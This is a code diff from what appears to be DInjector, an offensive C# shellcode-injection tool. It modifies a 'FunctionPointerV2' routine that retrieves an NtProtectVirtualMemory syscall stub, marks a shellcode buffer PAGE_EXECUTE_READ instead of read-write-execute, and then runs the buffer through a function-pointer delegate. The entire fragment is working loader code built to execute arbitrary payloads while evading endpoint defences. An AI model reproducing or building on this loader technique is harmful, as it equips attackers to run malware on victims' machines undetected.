@@ -14,7 +14,7 @@ namespace DInjector
             ref IntPtr BaseAddress,
             ref IntPtr RegionSize,
             uint NewProtect,
-            ref uint OldProtect);
+            out uint OldProtect);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         delegate void pFunction();
@@ -29,30 +29,29 @@ namespace DInjector
                 {
                     IntPtr baseAddress = (IntPtr)ptr;
 
-                    #region NtProtectVirtualMemory
+                    #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)
 
                     IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
                     NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));
 
                     IntPtr oldAddress = baseAddress;
                     IntPtr regionSize = (IntPtr)shellcode.Length;
-                    uint oldProtect = 0;
                     DI.Data.Native.NTSTATUS ntstatus;
 
                     ntstatus = sysNtProtectVirtualMemory(
                         Process.GetCurrentProcess().Handle,
                         ref baseAddress,
                         ref regionSize,
-                        DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE,
-                        ref oldProtect);
+                        DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
+                        out uint _);
 
                     if (ntstatus == 0)
                     {
-                        Console.WriteLine("(Module) [+] NtProtectVirtualMemory");
+                        Console.WriteLine("(FunctionPointerV2) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
                     }
                     else
                     {
-                        Console.WriteLine($"(Module) [-] NtProtectVirtualMemory: {ntstatus}");
+                        Console.WriteLine($"(FunctionPointerV2) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");
                     }
 
                     pFunction f = (pFunction)Marshal.GetDelegateForFunctionPointer(oldAddress, typeof(pFunction));
